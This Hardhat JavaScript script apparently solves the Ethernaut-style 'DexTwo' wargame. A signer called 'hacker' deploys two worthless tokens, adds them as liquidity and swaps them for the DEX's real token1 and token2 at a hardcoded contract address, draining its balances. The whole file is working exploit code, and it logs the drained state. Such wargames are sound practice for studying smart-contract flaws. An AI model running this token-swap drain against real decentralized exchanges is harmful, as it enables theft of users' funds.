const { ethers } = require("hardhat");


async function main() {

  const [hacker] = await ethers.getSigners();

  const WorthlessToken1 = await ethers.getContractFactory("WorthlessToken", hacker);
  const WorthlessToken2 = await ethers.getContractFactory("WorthlessToken", hacker);

  const worthlessToken1 = await WorthlessToken1.deploy("WorthlessToken1", "WTKN1", 300);
  const worthlessToken2 = await WorthlessToken2.deploy("WorthlessToken2", "WTKN2", 300);

  const Dex2_Address = '0x845C8F72d95B8Ad005F9a4A39071cd3C44b51594';

  const Dex2 = await ethers.getContractAt('DexTwo', Dex2_Address);

  const token1_address = await Dex2.token1();
  const token2_address = await Dex2.token2();
  
  let token1_dex2_balance = await Dex2.balanceOf(token1_address, Dex2_Address);
  let token2_dex2_balance = await Dex2.balanceOf(token2_address, Dex2_Address);

  let token1_hacker_balance = await worthlessToken1.balanceOf(hacker.address);
  let token2_hacker_balance = await worthlessToken2.balanceOf(hacker.address);
  
  console.log('\n------------------- INITIAL STATE -------------------\n')
  
  console.log(`Dex2 Token1 Balance: ${token1_dex2_balance.toString()}`);
  console.log(`Dex2 Token2 Balance: ${token2_dex2_balance.toString()}`);

  console.log(`Hacker Token1 Balance: ${token1_hacker_balance.toString()}`);
  console.log(`Hacker Token2 Balance: ${token2_hacker_balance.toString()}\n`);

  await worthlessToken1.approve(Dex2_Address, 200);
  let tx = await worthlessToken2.approve(Dex2_Address, 200);
  await tx.wait()

  await Dex2.connect(hacker).add_liquidity(worthlessToken1.address, 100);
  tx = await Dex2.connect(hacker).add_liquidity(worthlessToken2.address, 100);
  await tx.wait()

  await Dex2.connect(hacker).swap(worthlessToken1.address, token1_address, 100);
  
  tx = await Dex2.connect(hacker).swap(worthlessToken2.address, token2_address, 100);
  await tx.wait()

  console.log('\n------------------- STATE BEFORE HACK -------------------\n')

  token1_dex2_balance = await Dex2.balanceOf(token1_address, Dex2_Address);
  token2_dex2_balance = await Dex2.balanceOf(token2_address, Dex2_Address);

  console.log(`Dex2 Token1 Balance: ${token1_dex2_balance.toString()}`);
  console.log(`Dex2 Token2 Balance: ${token2_dex2_balance.toString()}`);
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
